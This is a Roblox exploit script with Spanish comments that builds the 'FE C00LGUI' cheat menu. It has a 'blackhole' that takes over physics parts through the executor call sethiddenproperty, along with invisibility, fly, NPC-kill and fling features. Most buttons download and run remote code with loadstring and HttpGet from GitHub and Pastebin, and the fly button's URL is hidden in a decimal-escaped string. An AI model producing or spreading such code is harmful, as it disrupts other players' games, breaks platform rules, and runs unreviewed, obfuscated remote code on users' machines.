local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local angle = 1
local radius = 50
local blackHoleActive = false

-- Crear ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "c00lkidGUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Panel principal agrandado SOLO DE ALTO
local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 520, 0, 230) -- Alto aumentado (antes 150)
frame.Position = UDim2.new(0.5, -260, 0.5, -115) -- Ajustar posición para que quede centrado verticalmente
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
frame.BorderSizePixel = 3
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 12)
uiCorner.Parent = frame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
titleLabel.Text = "FE C00LGUI"
titleLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.Arcade
titleLabel.Parent = frame

-- Función para crear botones (posición X y Y)
local function createButton(name, posX, posY, text)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Size = UDim2.new(0, 150, 0, 60)
    btn.Position = UDim2.new(0, posX, 0, posY)
    btn.Text = text
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.BorderColor3 = Color3.fromRGB(255, 0, 0)
    btn.BorderSizePixel = 3
    btn.TextColor3 = Color3.fromRGB(255, 0, 0)
    btn.TextScaled = true
    btn.Font = Enum.Font.Arcade
    btn.Parent = frame
    return btn
end

-- Crear los botones existentes + nuevo InfYield Button abajo de Blackhole
local blackholeButton = createButton("BlackholeButton", 20, 50, "BLACKHOLE")
local infYieldButton = createButton("InfYieldButton", 20, 120, "INF YIELD") -- Abajo de Blackhole
local invisibleButton = createButton("InvisibleButton", 190, 50, "INVISIBLE")
local killNpcButton = createButton("KillNpcButton", 360, 50, "KILL NPC SCRIPT")
local flyButton = createButton("FlyButton", 190, 120, "FLY BUTTON")
local killerfishButton = createButton("KillerfishButton", 360, 120, "KILLERFISH") -- Al lado de Fly

-- Setup Blackhole Core (igual que antes)
local humanoidRootPart, Attachment1

local function setupBlackholeCore()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local folder = Workspace:FindFirstChild("BlackholeFolder")
    if not folder then
        folder = Instance.new("Folder", Workspace)
        folder.Name = "BlackholeFolder"
    end
    local part = folder:FindFirstChild("BlackholeCore")
    if not part then
        part = Instance.new("Part", folder)
        part.Name = "BlackholeCore"
        part.Anchored = true
        part.CanCollide = false
        part.Transparency = 1
        part.Size = Vector3.new(1, 1, 1)
    end
    local attachment = part:FindFirstChildWhichIsA("Attachment")
    if not attachment then
        attachment = Instance.new("Attachment", part)
    end
    Attachment1 = attachment
end
setupBlackholeCore()

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.462, 14.462, 14.462)
    }
    Network.RetainPart = function(part)
        if typeof(part)=="Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, part)
            part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
            part.CanCollide = false
        end
    end
    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            pcall(function()
                sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            end)
            for _, part in pairs(Network.BaseParts) do
                if part:IsDescendantOf(Workspace) then
                    part.Velocity = Network.Velocity
                end
            end
        end)
    end
    EnablePartControl()
end

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name~="Handle" then
        for _, x in pairs(v:GetChildren()) do
            if x:IsA("BodyMover") or x:IsA("Torque") or x:IsA("AlignPosition") or x:IsA("Attachment") then
                x:Destroy()
            end
        end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(1000000, 1000000, 1000000)
        local AlignPosition = Instance.new("AlignPosition", v)
        AlignPosition.MaxForce = math.huge
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 500
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    blackholeButton.Text = blackHoleActive and "BLACKHOLE: ON" or "BLACKHOLE: OFF"
    if blackHoleActive then
        for _, v in pairs(Workspace:GetDescendants()) do
            ForcePart(v)
        end
        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)
        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                angle = angle + math.rad(2)
                local offsetX = math.cos(angle) * radius
                local offsetZ = math.sin(angle) * radius
                Attachment1.WorldCFrame = humanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)
            end
        end)
    else
        Attachment1.WorldCFrame = CFrame.new(0, -1000, 0)
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    setupBlackholeCore()
    if blackHoleActive then
        toggleBlackHole()
    end
end)

-- Botones y sus scripts
blackholeButton.MouseButton1Click:Connect(toggleBlackHole)

infYieldButton.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end)
end)

invisibleButton.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring(game:HttpGet("https://pastebin.com/raw/vP6CrQJj"))()
    end)
end)

killNpcButton.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/shakk-code/fe-punch-script/refs/heads/main/script.lua', true))()
    end)
end)

flyButton.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
    end)
end)

killerfishButton.MouseButton1Click:Connect(function()
    pcall(function()
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCore("SendNotification", {
            Title = "FE killerfish";
            Text = "script made by Scripter-u1b follow me on yt! .";
            Duration = 5;
        })
        local player = game.Players.LocalPlayer
        local userInput = game:GetService("UserInputService")
        local function ragdoll(character, enable)
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if not humanoid then return end
            local isR6 = humanoid.RigType == Enum.HumanoidRigType.R6
            humanoid.PlatformStand = enable
            humanoid.AutoRotate = not enable
            humanoid.Sit = false
            local function disableJoint(motor)
                local a1 = Instance.new("Attachment", motor.Part0)
                local a2 = Instance.new("Attachment", motor.Part1)
                a1.CFrame = motor.C0
                a2.CFrame = motor.C1
                local socket = Instance.new("BallSocketConstraint")
                socket.Attachment0 = a1
                socket.Attachment1 = a2
                socket.Parent = motor.Parent
                motor.Enabled = false
                motor.Name = "DisabledMotor"
            end
            local function enableJoint(motor)
                motor.Enabled = true
                motor.Name = "Motor6D"
                for _, item in pairs(motor.Parent:GetChildren()) do
                    if item:IsA("BallSocketConstraint") or item:IsA("Attachment") then
                        item:Destroy()
                    end
                end
            end
            for _, joint in character:GetDescendants() do
                if joint:IsA("Motor6D") and (isR6 and joint.Name ~= "Neck" or not isR6) then
                    if enable and joint.Name ~= "DisabledMotor" then
                        disableJoint(joint)
                    elseif not enable and joint.Name == "DisabledMotor" then
                        enableJoint(joint)
                    end
                end
            end
        end
        local function flingKnockback(directionVec)
            local char = player.Character or player.CharacterAdded:Wait()
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if not hrp or not humanoid then return end
            local force = directionVec.Unit * 300 + Vector3.new(0, 250, 0)
            ragdoll(char, true)
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp:ApplyImpulse(force * hrp.AssemblyMass)
            task.wait(2)
            ragdoll(char, false)
        end
        local enabled = true
        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Died:Connect(function()
                enabled = false
            end)
        end
        player.CharacterAdded:Connect(function(char)
            humanoid = char:WaitForChild("Humanoid")
            enabled = true
            humanoid.Died:Connect(function()
                enabled = false
            end)
        end)
        userInput.InputBegan:Connect(function(input, processed)
            if processed and input.UserInputType ~= Enum.UserInputType.Keyboard then return end
            if input.KeyCode == Enum.KeyCode.E and enabled then
                local cameraDirection = workspace.CurrentCamera.CFrame.LookVector
                flingKnockback(cameraDirection)
            end
        end)
    end)
end)

-- Notificación de créditos al cargar el GUI
local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("SendNotification", {
    Title = "FE C00LGUI LOADED!",
    Text = "credits to Scripter-u1b follow me on YT!",
    Duration = 5,
})
